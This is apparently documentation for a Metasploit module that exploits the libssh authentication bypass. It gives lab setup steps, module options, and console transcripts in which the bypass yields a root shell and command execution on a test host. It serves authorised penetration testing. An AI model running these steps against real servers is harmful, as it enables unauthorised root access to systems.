## Introduction

This module exploits an authentication bypass in libssh server code
where a `USERAUTH_SUCCESS` message is sent in place of the expected
`USERAUTH_REQUEST` message. libssh versions 0.6.0 through 0.7.5 and
0.8.0 through 0.8.3 are vulnerable.

Note that this module's success depends on whether the server code
can trigger the correct (`shell`/`exec`) callbacks despite only the state
machine's authenticated state being set.

Therefore, you may or may not get a shell if the server requires
additional code paths to be followed.

## Setup

1. `git clone git://git.libssh.org/projects/libssh.git`
2. `cd libssh` and `git checkout libssh-0.8.3`
3. `git apply -p1 /path/to/metasploit-framework/external/source/libssh/ssh_server_fork.patch`
4. Follow the steps in `INSTALL` to build libssh
5. Run `build/examples/ssh_server_fork` (I like to `strace` it)

## Actions

```
Name     Description
----     -----------
Execute  Execute a command
Shell    Spawn a shell
```

## Options

**CMD**

Set this to a command or shell you want to execute. An `exec` channel
request will be sent instead of a `shell` channel request.

**SPAWN_PTY**

Enable this if you would like a PTY. Some server implementations may
require this. Note that you WILL be logged in `utmp`, `wtmp`, and
`lastlog` in most cases.

**CHECK_BANNER**

This is a banner check for libssh. It's not sophisticated, and the
banner may be changed, but it may prevent false positives due to how the
OOB authentication packet always returns `true`.

## Usage

Positive testing against unpatched libssh 0.8.3:

```
msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts 172.28.128.3
rhosts => 172.28.128.3
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 2222
rport => 2222
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true
spawn_pty => true
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set verbose true
verbose => true
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:2222 - Attempting authentication bypass
[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
[*] Command shell session 1 opened (172.28.128.1:56981 -> 172.28.128.3:2222) at 2018-10-19 12:38:24 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -1
[*] Starting interaction with 1...

# id
id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
uname -a
Linux ubuntu-xenial 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
# tty
tty
/dev/pts/1
#
```

Positive testing of shell commands using the `Execute` action:

```
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set action Execute
action => Execute
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set cmd id; uname -a
cmd => id; uname -a
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:2222 - Attempting authentication bypass
[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
[*] 172.28.128.3:2222 - Executed: id; uname -a
uid=0(root) gid=0(root) groups=0(root)
Linux ubuntu-xenial 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
```

Negative testing against patched libssh 0.8.4:

```
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:2222 - Attempting authentication bypass
[-] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.4 appears to be patched
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
```

Negative testing against an insufficiently implemented libssh server:

```
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:2222 - Attempting authentication bypass
[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
[-] 172.28.128.3:2222 - Net::SSH::ChannelOpenFailed: Session channel open failed (1)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:2222 - Attempting authentication bypass
[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
[-] 172.28.128.3:2222 - Net::SSH::ChannelRequestFailed: Shell/exec channel request failed
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
```

Negative testing against OpenSSH:

```
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 22
rport => 22
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 172.28.128.3:22 - Attempting authentication bypass
[-] 172.28.128.3:22 - SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 does not appear to be libssh
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
```

Confirming auth is still normally present using the OpenSSH client:

```
wvu@kharak:~$ ssh -vp 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null myuser@172.28.128.3
[snip]
debug1: Authentications that can continue: password
debug1: Next authentication method: password
myuser@172.28.128.3's password: wrongpassword
debug1: Authentications that can continue: password
Permission denied, please try again.
myuser@172.28.128.3's password: mypassword
debug1: Authentication succeeded (password).
Authenticated to 172.28.128.3 ([172.28.128.3]:2222).
[snip]
#
```
